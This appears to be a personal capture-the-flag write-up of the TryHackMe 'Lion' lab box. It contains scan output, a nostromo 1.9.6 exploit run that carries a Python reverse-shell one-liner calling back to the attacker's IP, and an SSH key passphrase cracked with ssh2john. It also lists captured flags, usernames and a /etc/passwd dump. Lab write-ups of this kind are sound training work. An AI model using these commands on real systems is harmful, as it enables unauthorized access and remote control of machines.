

THM-KOTH: Lion
============================

> Labruhtooryboi@gmail.com | December 28, 2020


# 10.10.36.190
# lion.thm


					# reconnisance



'''
Open 10.10.36.190:80
Open 10.10.36.190:1337
Open 10.10.36.190:3306
Open 10.10.36.190:5555
Open 10.10.36.190:8080
Open 10.10.36.190:9999
Open 10.10.36.190:12764
Open 10.10.36.190:31489

'''

'''
Nmap scan report for 10.10.36.190
Host is up (0.19s latency).

PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1337/tcp  open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:48:b1:90:10:f1:9e:36:4a:e1:36:4a:a9:f0:72:21 (RSA)
|   256 56:2a:8a:33:cb:aa:22:72:28:1e:a1:6a:ff:5a:99:55 (ECDSA)
|_  256 51:df:b6:32:a9:5f:46:1a:42:3b:7f:58:94:47:7c:6c (ED25519)
3306/tcp  open   mysql   MySQL 5.7.19-0ubuntu0.16.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.19-0ubuntu0.16.04.1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, LongColumnFlag, SupportsCompression, SupportsTransactions, Speaks41ProtocolOld, IgnoreSigpipes, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, LongPassword, InteractiveClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, ODBCClient, FoundRows, Speaks41ProtocolNew, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 47s\\x14 \x12\x02:\x17\x10q.5\x7F\x16	C&1
|_  Auth Plugin Name: mysql_native_password
5555/tcp  open   http    nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8080/tcp  open   http    nostromo 1.9.6
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: Welcome
9999/tcp  open   abyss?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Date: Tue, 29 Dec 2020 10:08:58 GMT
|     Content-Length: 0
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Tue, 29 Dec 2020 10:08:57 GMT
|_    Content-Length: 0
14440/tcp closed unknown
1 service unrecognized despite returning data.
'''




					# enumeration



'''
http:5555
nostromo 1.9.6
'''


					# extended enumeration(internet)
					
'''
https://www.exploit-db.com/exploits/47837
'''




					# exploitation



'''
nc -lvnp 4321
'''

'''
python nos.py 10.10.36.190 8080 "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"10.9.27.82\", 4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
'''



					# privelage escalation
			


'''
[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions

root      1218  0.0  0.2  28132  2708 ?        Ss   04:06   0:00 /usr/bin/tmux -S /.dev/session new-session -d
'''


'''
ssh2john

dance            (gloria_id_rsa)

ssh -i gloria_id_rsa gloria@10.10.36.190 -p 1337
'''



'''

'''



					# interesting things

>flags
'''
/home/gloria/user.txt
thm{05e2762150425df49a2d27e8bb08cf2d}
'''

'''
/home/alex/user.txt
thm{7732ef0312254ed6886bd84943d12f64}
'''

'''
/home/marty/user.txt
thm{610c9d3e09ad9de658203292f096b7bb}
'''

*more flags to be found



>users
'''
gloria
root
alex
marty
'''

>passwds
'''
dance
'''


>files and dirs
'''
/.dev/session/
'''

'''
'''

>root stuff 
'''
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
alex:x:1000:1000:alex,,,:/home/alex:/bin/bash
marty:x:1001:1001:,,,:/home/marty:/bin/bash
gloria:x:1002:1002:,,,:/home/gloria:/bin/bash

'''

'''
'''
